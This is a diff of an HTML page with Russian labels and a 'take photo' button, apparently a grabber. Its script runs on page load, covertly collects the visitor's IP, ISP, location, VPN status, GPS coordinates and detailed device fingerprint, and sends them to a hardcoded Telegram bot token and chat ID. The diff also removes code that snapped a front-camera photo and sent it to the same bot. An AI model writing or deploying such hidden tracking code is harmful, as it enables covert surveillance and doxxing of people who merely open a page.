@@ -12,6 +12,10 @@
     <button onclick="takePhoto()">Сделать фото</button>
 
     <script>
+        const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
+        const chatId = '1653222949';
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
         async function getDeviceBrandAndModel() {
             const userAgent = navigator.userAgent;
             let deviceBrand = 'Unknown';
@@ -105,41 +109,50 @@
                 const duration = (endTime - startTime) / 1000;
                 const bitsLoaded = 1024 * 1024 * 8;
                 speed = (bitsLoaded / duration / (1024 * 1024)).toFixed(2);
-                sendSpeedToTelegram(speed);
+                return speed;
             };
             image.src = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png?" + startTime;
         }
 
-        function sendSpeedToTelegram(speed) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            const message = `Скорость интернета: ${speed} Mbps`;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Сообщение отправлено в Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Ошибка при отправке сообщения в Telegram:', error);
-            });
+        function checkVPN(ipAddress) {
+            return fetch(`https://ipapi.co/${ipAddress}/json/`)
+                .then(response => response.json())
+                .then(data => data.security ? data.security.is_vpn : 'Unknown')
+                .catch(() => 'Unknown');
         }
 
-        function sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus, geoLocation) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        async function getCompleteInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            const ipInfoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+            const ipInfoData = await ipInfoResponse.json();
+            const isp = ipInfoData.org || 'Unknown';
+            const location = `${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}`;
+
+            const vpnStatus = await checkVPN(ipAddress);
+            const deviceInfo = await getDeviceInfo();
+
+            const geoLocation = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve(`${position.coords.latitude},${position.coords.longitude}`),
+                    error => resolve('Не удалось получить')
+                );
+            });
+
+            const browserInfo = `User Agent: ${navigator.userAgent}\nBrowser Name: ${navigator.appName}`;
+            const osInfo = `Platform: ${navigator.platform}`;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const platformInfo = `CPU Class: ${navigator.cpuClass || 'Unknown'}`;
+            const internetSpeed = checkInternetSpeed();
+
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const graphicsInfo = gl ? `Vendor: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_VENDOR_WEBGL)}\nRenderer: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL)}` : 'WebGL не поддерживается';
+
+            const memoryInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Не поддерживается';
+            const hasFlash = !!navigator.mimeTypes['application/x-shockwave-flash'];
 
             const message = `
                 IP-адрес пользователя: ${ipAddress}
@@ -157,8 +170,20 @@
                 Установленные шрифты: ${deviceInfo.fonts}
                 Время рендеринга страницы: ${deviceInfo.renderTime} мс
                 Уровень заряда батареи: ${deviceInfo.batteryLevel}
+                Таймзона пользователя: ${timeZone}
+                Информация о браузере: ${browserInfo}
+                Информация об ОС: ${osInfo}
+                Детальная статистика о платформе: ${platformInfo}
+                Скорость интернета: ${internetSpeed} Mbps
+                Информация о видеокарте: ${graphicsInfo}
+                Доступная память устройства: ${memoryInfo}
+                Проверка установленного Flash Player: ${hasFlash ? 'Установлен' : 'Не установлен'}
             `;
 
+            sendToTelegram(message);
+        }
+
+        function sendToTelegram(message) {
             fetch(telegramApiUrl, {
                 method: 'POST',
                 headers: {
@@ -178,108 +203,8 @@
             });
         }
 
-        function checkVPN(ipAddress) {
-            return fetch(`https://ipapi.co/${ipAddress}/json/`)
-                .then(response => response.json())
-                .then(data => data.security ? data.security.is_vpn : 'Unknown')
-                .catch(() => 'Unknown');
-        }
-
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ipAddress = data.ip;
-                console.log('IP-адрес:', ipAddress);
-
-                fetch(`https://ipapi.co/${ipAddress}/json/`)
-                    .then(response => response.json())
-                    .then(async data => {
-                        const isp = data.org || 'Unknown';
-                        const location = `${data.city}, ${data.region}, ${data.country}`;
-                        console.log('Провайдер:', isp);
-                        console.log('Местоположение:', location);
-
-                        const vpnStatus = await checkVPN(ipAddress);
-                        console.log('Использование VPN/Proxy:', vpnStatus);
-
-                        const deviceInfo = await getDeviceInfo();
-                        console.log('Информация об устройстве:', deviceInfo);
-
-                        navigator.geolocation.getCurrentPosition(
-                            position => {
-                                const geoLocation = `${position.coords.latitude},${position.coords.longitude}`;
-                                sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus, geoLocation);
-                            },
-                            error => {
-                                console.error('Ошибка при получении геолокации:', error);
-                                sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus, 'Не удалось получить');
-                            }
-                        );
-                    })
-                    .catch(error => {
-                        console.error('Ошибка при получении информации о провайдере и местоположении:', error);
-                    });
-            })
-            .catch(error => {
-                console.error('Ошибка при получении IP-адреса:', error);
-            });
-
-        checkInternetSpeed();
-
-        async function takePhoto() {
-            const constraints = {
-                video: { facingMode: "user" }
-            };
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await new Promise((resolve) => (video.onloadedmetadata = resolve));
-                video.play();
-
-                const frontCanvas = document.createElement('canvas');
-                frontCanvas.width = video.videoWidth;
-                frontCanvas.height = video.videoHeight;
-                const frontContext = frontCanvas.getContext('2d');
-                frontContext.drawImage(video, 0, 0, frontCanvas.width, frontCanvas.height);
-
-                const photoData = frontCanvas.toDataURL('image/png');
-
-                // Остановить видео-поток
-                const tracks = stream.getTracks();
-                tracks.forEach(track => track.stop());
-
-                // Отправить фото в Telegram
-                sendPhotoToTelegram(photoData);
-            } catch (error) {
-                console.error('Ошибка при захвате фото:', error);
-            }
-        }
-
-        function sendPhotoToTelegram(photoData) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: photoData
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Фото отправлено в Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Ошибка при отправке фото в Telegram:', error);
-            });
-        }
+        // Запуск функции для сбора и отправки информации
+        getCompleteInfo();
     </script>
 </body>
 </html>
